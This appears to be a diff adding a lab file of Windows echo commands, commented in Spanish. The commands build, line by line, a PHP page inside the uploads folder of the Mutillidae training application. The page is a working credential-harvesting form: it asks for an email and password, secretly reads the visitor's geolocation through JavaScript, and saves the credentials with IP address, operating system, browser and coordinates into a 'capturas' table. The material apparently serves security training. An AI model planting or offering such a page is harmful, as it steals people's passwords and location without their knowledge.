@@ -1,0 +1,58 @@
+Se colocó linea por linea para que se vayan agregando al archivo
+
+echo ^<?php > C:\xampp\htdocs\mutillidae\uploads\formulario.php
+echo // Conexión a la base de datos >> C:\xampp\htdocs\mutillidae\uploads\formulario.php
+echo $conexion = new mysqli("localhost", "root", "", "datos"); >> C:\xampp\htdocs\mutillidae\uploads\formulario.php
+echo. >> C:\xampp\htdocs\mutillidae\uploads\formulario.php
+echo if ($_SERVER["REQUEST_METHOD"] == "POST") { >> C:\xampp\htdocs\mutillidae\uploads\formulario.php
+echo     $correo = $_POST['correo']; >> C:\xampp\htdocs\mutillidae\uploads\formulario.php
+echo     $contrasena = $_POST['contrasena']; >> C:\xampp\htdocs\mutillidae\uploads\formulario.php
+echo. >> C:\xampp\htdocs\mutillidae\uploads\formulario.php
+echo     // Extraer info del sistema >> C:\xampp\htdocs\mutillidae\uploads\formulario.php
+echo     $ip = $_SERVER['REMOTE_ADDR']; >> C:\xampp\htdocs\mutillidae\uploads\formulario.php
+echo     $so = php_uname(); >> C:\xampp\htdocs\mutillidae\uploads\formulario.php
+echo     $navegador = $_SERVER['HTTP_USER_AGENT']; >> C:\xampp\htdocs\mutillidae\uploads\formulario.php
+echo     $fecha = date('Y-m-d H:i:s'); >> C:\xampp\htdocs\mutillidae\uploads\formulario.php
+echo. >> C:\xampp\htdocs\mutillidae\uploads\formulario.php
+echo     // Coordenadas vía JS >> C:\xampp\htdocs\mutillidae\uploads\formulario.php
+echo     $lat = $_POST['lat'] ?? 'No disponible'; >> C:\xampp\htdocs\mutillidae\uploads\formulario.php
+echo     $lon = $_POST['lon'] ?? 'No disponible'; >> C:\xampp\htdocs\mutillidae\uploads\formulario.php
+echo. >> C:\xampp\htdocs\mutillidae\uploads\formulario.php
+echo     $stmt = $conexion->prepare("INSERT INTO capturas (correo, contrasena, ip, so, navegador, fecha, latitud, longitud) VALUES (?, ?, ?, ?, ?, ?, ?, ?)"); >> C:\xampp\htdocs\mutillidae\uploads\formulario.php
+echo     $stmt->bind_param("ssssssss", $correo, $contrasena, $ip, $so, $navegador, $fecha, $lat, $lon); >> C:\xampp\htdocs\mutillidae\uploads\formulario.php
+echo     $stmt->execute(); >> C:\xampp\htdocs\mutillidae\uploads\formulario.php
+echo     $stmt->close(); >> C:\xampp\htdocs\mutillidae\uploads\formulario.php
+echo. >> C:\xampp\htdocs\mutillidae\uploads\formulario.php
+echo     // Redirección para recargar la página y evitar reenvío del formulario >> C:\xampp\htdocs\mutillidae\uploads\formulario.php
+echo     header("Location: " . $_SERVER['PHP_SELF']); >> C:\xampp\htdocs\mutillidae\uploads\formulario.php
+echo     exit; >> C:\xampp\htdocs\mutillidae\uploads\formulario.php
+echo } >> C:\xampp\htdocs\mutillidae\uploads\formulario.php
+echo ?^> >> C:\xampp\htdocs\mutillidae\uploads\formulario.php
+echo. >> C:\xampp\htdocs\mutillidae\uploads\formulario.php
+echo ^<!DOCTYPE html^> >> C:\xampp\htdocs\mutillidae\uploads\formulario.php
+echo ^<html^> >> C:\xampp\htdocs\mutillidae\uploads\formulario.php
+echo ^<head^> >> C:\xampp\htdocs\mutillidae\uploads\formulario.php
+echo     ^<title^>Ingreso^</title^> >> C:\xampp\htdocs\mutillidae\uploads\formulario.php
+echo     ^<script^> >> C:\xampp\htdocs\mutillidae\uploads\formulario.php
+echo         function obtenerUbicacion() { >> C:\xampp\htdocs\mutillidae\uploads\formulario.php
+echo             if (navigator.geolocation) { >> C:\xampp\htdocs\mutillidae\uploads\formulario.php
+echo                 navigator.geolocation.getCurrentPosition(function(position) { >> C:\xampp\htdocs\mutillidae\uploads\formulario.php
+echo                     document.getElementById("lat").value = position.coords.latitude; >> C:\xampp\htdocs\mutillidae\uploads\formulario.php
+echo                     document.getElementById("lon").value = position.coords.longitude; >> C:\xampp\htdocs\mutillidae\uploads\formulario.php
+echo                 }); >> C:\xampp\htdocs\mutillidae\uploads\formulario.php
+echo             } >> C:\xampp\htdocs\mutillidae\uploads\formulario.php
+echo         } >> C:\xampp\htdocs\mutillidae\uploads\formulario.php
+echo         window.onload = obtenerUbicacion; >> C:\xampp\htdocs\mutillidae\uploads\formulario.php
+echo     ^</script^> >> C:\xampp\htdocs\mutillidae\uploads\formulario.php
+echo ^</head^> >> C:\xampp\htdocs\mutillidae\uploads\formulario.php
+echo ^<body^> >> C:\xampp\htdocs\mutillidae\uploads\formulario.php
+echo     ^<h2^>Ingresa tus datos^</h2^> >> C:\xampp\htdocs\mutillidae\uploads\formulario.php
+echo     ^<form method="post"^> >> C:\xampp\htdocs\mutillidae\uploads\formulario.php
+echo         ^<input type="email" name="correo" placeholder="Correo" required^>^<br^>^<br^> >> C:\xampp\htdocs\mutillidae\uploads\formulario.php
+echo         ^<input type="password" name="contrasena" placeholder="Contraseña" required^>^<br^>^<br^> >> C:\xampp\htdocs\mutillidae\uploads\formulario.php
+echo         ^<input type="hidden" name="lat" id="lat"^> >> C:\xampp\htdocs\mutillidae\uploads\formulario.php
+echo         ^<input type="hidden" name="lon" id="lon"^> >> C:\xampp\htdocs\mutillidae\uploads\formulario.php
+echo         ^<button type="submit"^>Enviar^</button^> >> C:\xampp\htdocs\mutillidae\uploads\formulario.php
+echo     ^</form^> >> C:\xampp\htdocs\mutillidae\uploads\formulario.php
+echo ^</body^> >> C:\xampp\htdocs\mutillidae\uploads\formulario.php
+echo ^</html^> >> C:\xampp\htdocs\mutillidae\uploads\formulario.php
